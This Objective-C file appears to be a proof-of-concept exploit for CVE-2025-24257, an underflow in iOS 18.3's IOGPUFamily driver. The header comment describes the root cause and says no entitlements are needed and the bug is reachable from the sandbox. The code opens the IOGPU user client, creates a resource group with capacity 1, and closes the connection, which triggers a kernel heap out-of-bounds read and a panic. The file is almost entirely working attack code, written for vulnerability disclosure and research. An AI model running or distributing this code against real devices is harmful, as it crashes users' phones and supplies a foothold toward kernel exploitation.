//
//  CVE_2025_24257.m
//  IOGPUFamily bitmap_mask underflow → kernel heap OOB read (panic)
//
//  Researcher: Wang Yu of Cyberserval (original discovery)
//  Target: iOS 18.3 (22D60) — VULNERABLE | Fixed in iOS 18.4
//  Service: IOGPU (type=1) | Entitlements: NONE | Sandbox: YES
//
//  Root cause:
//    newResourceGroup(capacity) computes bitmap_mask = (capacity >> 6) - 1
//    When capacity < 64: bitmap_mask = 0xFFFFFFFF (unsigned underflow)
//    The destructor iterates bitmap[0..bitmap_mask] on connection close,
//    reading 32GB past the 8-byte bitmap allocation → kernel panic.
//
//  This PoC triggers a kernel panic. No exploitation attempted.
//

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

void trigger_CVE_2025_24257(void) {
    NSLog(@"[CVE-2025-24257] IOGPUFamily bitmap_mask underflow PoC");
    NSLog(@"[CVE-2025-24257] Opening IOGPU service...");

    // ── Step 1: Open IOGPU user client (no entitlements required) ──
    io_service_t service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching("IOGPU")
    );
    if (service == IO_OBJECT_NULL) {
        NSLog(@"[CVE-2025-24257] IOGPU service not found");
        return;
    }

    io_connect_t conn = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 1, &conn);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS || conn == IO_OBJECT_NULL) {
        NSLog(@"[CVE-2025-24257] IOServiceOpen failed: 0x%x", kr);
        return;
    }
    NSLog(@"[CVE-2025-24257] Connection: 0x%x", conn);

    // ── Step 2: Create vulnerable resource group ──
    // selector 9 = s_new_resource
    // structIn[0]  = 3  (resType = resource group)
    // structIn[56] = 1  (capacity = 1)
    //
    // Inside the kernel, newResourceGroup computes:
    //   bitmap_mask = (capacity >> 6) - 1
    //   capacity=1 → (1 >> 6) = 0 → 0 - 1 = 0xFFFFFFFF (unsigned underflow!)
    //
    // The bitmap is allocated as 8 bytes (1 qword) in a kalloc.16 zone element.
    // But bitmap_mask says there are 4 billion qwords (32GB).
    uint8_t in[128] = {0};
    uint8_t out[128] = {0};
    *(uint32_t *)(in + 0) = 3;   // resType = resource group
    *(uint32_t *)(in + 56) = 1;  // capacity = 1 → bitmap_mask = 0xFFFFFFFF
    size_t outSz = 128;

    kr = IOConnectCallMethod(conn, 9, NULL, 0, in, 128, NULL, NULL, out, &outSz);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[CVE-2025-24257] s_new_resource failed: 0x%x", kr);
        IOServiceClose(conn);
        return;
    }

    uint32_t resourceId = *(uint32_t *)(out + 40);
    uint32_t handle = *(uint32_t *)(out + 48);
    NSLog(@"[CVE-2025-24257] Vuln resource created: id=0x%x handle=0x%x", resourceId, handle);
    NSLog(@"[CVE-2025-24257] bitmap_mask = 0xFFFFFFFF (should be 0)");

    // ── Step 3: Close connection → kernel panic ──
    // IOServiceClose triggers resource cleanup on the IOKit workloop thread.
    // The destructor iterates bitmap[0..bitmap_mask] (4 billion qwords).
    // After ~50-500 elements it reads past the zone page into unmapped memory → panic.
    //
    // Panic signature:
    //   pc = sub_FFFFFFF009863C7C (bitmap iterator in IOGPUFamily)
    //   FAR = unmapped kernel address past kalloc.type.var*.16 zone page
    NSLog(@"[CVE-2025-24257] Closing connection → kernel panic...");
    IOServiceClose(conn);

    // Never reached
    NSLog(@"[CVE-2025-24257] Unexpected: no panic");
}
